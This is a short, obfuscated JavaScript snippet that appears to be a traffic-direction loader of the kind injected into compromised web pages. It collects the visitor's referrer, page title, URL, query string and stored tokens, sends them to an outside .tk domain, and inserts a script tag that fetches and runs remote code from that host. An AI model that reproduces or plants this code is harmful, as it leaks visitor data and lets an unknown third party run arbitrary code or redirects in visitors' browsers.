   (function() {
    var name = '_GQSH78bLtSXtjhZ1';
    if (!window._GQSH78bLtSXtjhZ1) {
        window._GQSH78bLtSXtjhZ1 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://paygambfasliling.tk/joggers-fitness',
            P_PATH: 'https://paygambfasliling.tk/fec84ce/postback',
        };
    }
    const _s4vPd1Rz8pb8hcgG = localStorage.getItem('config');
    if (typeof _s4vPd1Rz8pb8hcgG !== 'undefined' && _s4vPd1Rz8pb8hcgG !== null) {
        var _T5jRsCDqxnrFqXQx = JSON.parse(_s4vPd1Rz8pb8hcgG);
        var _gNh6f8dZZ4DzbMKB = Math.round(+new Date()/1000);
        if (_T5jRsCDqxnrFqXQx.created_at + window._GQSH78bLtSXtjhZ1.ttl < _gNh6f8dZZ4DzbMKB) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _JKpj8M3LjjKm2CQY = localStorage.getItem('subId');
    var _XG6tGxDt75v8Rx6L = localStorage.getItem('token');
    var _jKZPGfjCcdv2dvvj = '?return=js.client';
        _jKZPGfjCcdv2dvvj += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _jKZPGfjCcdv2dvvj += '&se_referrer=' + encodeURIComponent(document.referrer);
        _jKZPGfjCcdv2dvvj += '&default_keyword=' + encodeURIComponent(document.title);
        _jKZPGfjCcdv2dvvj += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _jKZPGfjCcdv2dvvj += '&name=' + encodeURIComponent(name);
        _jKZPGfjCcdv2dvvj += '&host=' + encodeURIComponent(window._GQSH78bLtSXtjhZ1.R_PATH);
    if (typeof _JKpj8M3LjjKm2CQY !== 'undefined' && _JKpj8M3LjjKm2CQY && window._GQSH78bLtSXtjhZ1.unique) {
        _jKZPGfjCcdv2dvvj += '&sub_id=' + encodeURIComponent(_JKpj8M3LjjKm2CQY);
    }
    if (typeof _XG6tGxDt75v8Rx6L !== 'undefined' && _XG6tGxDt75v8Rx6L && window._GQSH78bLtSXtjhZ1.unique) {
        _jKZPGfjCcdv2dvvj += '&token=' + encodeURIComponent(_XG6tGxDt75v8Rx6L);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._GQSH78bLtSXtjhZ1.R_PATH + _jKZPGfjCcdv2dvvj;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
